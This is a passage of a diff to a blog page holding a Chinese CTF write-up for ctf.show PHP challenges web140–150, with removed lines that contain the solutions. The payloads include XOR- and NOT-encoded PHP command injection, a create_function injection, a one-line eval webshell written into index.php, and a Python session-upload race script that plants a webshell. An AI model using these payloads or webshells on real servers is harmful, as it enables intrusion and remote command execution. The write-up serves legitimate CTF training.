class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<ul>
-<li><p>题目分析：要求我们输入f1和f2必须是小写字母和数字的组成</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>0和字符串进行弱比较的时候返回的就是true，因为比较时会先将字符串类型转化成相同，再比较，<br>所以只要intval（$code）为0<br>所以code是字符串就行</p>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><br>- ```<br>  POST：	<span class="hljs-built_in">f1</span><span class="hljs-symbol">=md5</span>&amp;<span class="hljs-built_in">f2</span><span class="hljs-symbol">=md5</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h3><ul>
-<li><pre><code class="hljs">正则匹配：
-\w :匹配字母数字下划线
-\W :非字母数字下划线
-<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>- ```<br>  绕过return的方式：<br>  php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <span class="hljs-number">1</span><span class="hljs-built_in">-phpinfo</span>();结合减号是可以执行<span class="hljs-built_in">phpinfo</span>()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>&#96;&#96;&#96;<br>system(tac f*);<br>经过取反处理<br>(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);<br>payload：<br>?v1&#x3D;1&amp;v3&#x3D;-(<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5);-&amp;v2&#x3D;1</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- ```php<br>  <span class="hljs-comment"># 取反脚本</span><br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>])^<span class="hljs-number">0xff</span>);<br>  &#125;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;^&quot;</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>); <span class="hljs-variable">$i</span>++) &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;%ff&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><ul>
-<li>&#96;&#96;&#96;<br>&#x2F;?v1&#x3D;0<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">143</span><br><br>- 类似web<span class="hljs-number">141</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>*(<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)(<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)*<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><ul>
-<li><p>这道题对v3进行check，要求v3的长度为1，但没有对v2进行check，所以把命令赋值给v2</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%00”^”%7f%60%60%20%60%2a”)</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>### web<span class="hljs-number">145</span><br><br>- ```<br>  ?v<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;v<span class="hljs-number">3</span><span class="hljs-operator">=</span>|(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span>)(~<span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%df</span><span class="hljs-variable">%99</span><span class="hljs-variable">%d5</span>)|&amp;v<span class="hljs-number">2</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><ul>
-<li><pre><code class="hljs">?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web147</span><br><br>- ```php<br>  <span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="hljs-variable">$ctfshow</span>)) &#123;<br>          <span class="hljs-variable">$ctfshow</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>
-</code></pre>
-</li>
-<li><p>分析正则表达式：<br>&#x2F;i不区分大小写<br>&#x2F;s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]<br>&#x2F;D如果使用$限制结尾字符,则不允许结尾有换行</p>
-</li>
-<li><p>正则的意思是：不能出现以下划线、数字、大小写字母开头并结尾的字符串。很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。</p>
-</li>
-<li><p>所以使用create_function()代码注入，利用\绕过</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>为什么使用\绕过？<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径即在当前的空间内调用； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径即去\这个空间调用。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p>
-<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><br>- ```<br>  get: show=<span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//</span><br>  post: ctf=\create_function<br>   <br>  结果就是：<br>  $ctfshow(<span class="hljs-string">&#x27;&#x27;</span>,$_GET[<span class="hljs-string">&#x27;show&#x27;</span>]);<br>  =&gt;<br>   <br>  \creat_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;echo 123;&#125;system(&#x27;</span>tac f*<span class="hljs-string">&#x27;);//&#x27;</span>);<br>  =&gt;<br>   <br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;&#125;system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br>   <br>  =&gt;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span><span class="hljs-params">()</span></span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-number">123</span>;<br>  &#125;<br>  system(<span class="hljs-string">&#x27;tac f*&#x27;</span>);<span class="hljs-comment">//;&#125;</span><br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><ul>
-<li><p>没有过滤^直接异或构造</p>
-</li>
-<li><p>&#96;&#96;&#96;<br>?code&#x3D;(“%08%02%08%09%05%0d”^”%7b%7b%7b%7d%60%60”)(“%09%01%03%01%06%02”^”%7d%60%60%21%60%28”);</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web149</span><br><br>- unlink 删除文件<br><br>- 直接写index里面一句话木马<br><br>- ```<br>  GET:?ctf=index.php<br>  POST:show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br>  然后访问url/index.php;POST传参<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /ctfshow_fl0g_here.txt&#x27;</span>);<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="web150和150-plus"><a href="#web150和150-plus" class="headerlink" title="web150和150_plus"></a>web150和150_plus</h3><ul>
-<li><p>Session文件包含</p>
-</li>
-<li><p>&#96;&#96;&#96;python</p>
-</li>
-</ul>
-<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><h1 id="Time-20-12-5-13-52"><a href="#Time-20-12-5-13-52" class="headerlink" title="@Time : 20.12.5 13:52"></a>@Time : 20.12.5 13:52</h1><h1 id="author-lonmar"><a href="#author-lonmar" class="headerlink" title="@author:lonmar"></a>@author:lonmar</h1><p>  import io<br>  import requests<br>  import threading</p>
-<p>  sessid &#x3D; ‘test’<br>  data &#x3D; {<br>      “ctf”: “&#x2F;tmp&#x2F;sess_test”,<br>      “cmd”: ‘system(“cat flag.php”);’<br>  }</p>
-<p>  def write(session):<br>      while event.isSet():<br>          f &#x3D; io.BytesIO(b’a’ * 1024 * 50)<br>          resp &#x3D; session.post(‘<a target="_blank" rel="noopener" href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/&#39;</a>,<br>                              data&#x3D;{‘PHP_SESSION_UPLOAD_PROGRESS’: ‘<?php eval($_POST["cmd"]);?>‘},<br>                              files&#x3D;{‘file’: (‘test.txt’, f)}, cookies&#x3D;{‘PHPSESSID’: sessid})</p>
-<p>  def read(session):<br>      while event.isSet():<br>          res &#x3D; session.post(<br>              ‘<a target="_blank" rel="noopener" href="http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;">http://b2714a45-4bd4-416b-87cd-98d7f177a2b1.challenge.ctf.show/?isVIP=1&#39;</a>,<br>              data&#x3D;data<br>          )<br>          if ‘flag{‘ in res.text:<br>              print(res.text)<br>              event.clear()<br>          else:<br>              print(‘[*]retrying…’)</p>
-<p>  if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>      event &#x3D; threading.Event()<br>      event.set()<br>      with requests.session() as session:<br>          for i in range(1, 5):<br>              threading.Thread(target&#x3D;write, args&#x3D;(session,)).start()</p>
-<pre><code class="hljs">      for i in range(1, 5):
-          threading.Thread(target=read, args=(session,)).start()
-</code></pre>
-<pre><code class="hljs">
-
-</code></pre>
+                <p><a target="_blank" rel="noopener" href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7.html">http://118.178.126.49/blogs/CTF_show_Web入门_php特性.html</a></p>
 
                 
               </div>
@@ -601,6 +376,31 @@ $argv,$argc在web模式下不适用
             </div>
 
             
+  <article id="comments" lazyload>
+    
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://example.com/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/';
+          this.page.identifier = '/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
           </article>
         </div>
       </div>
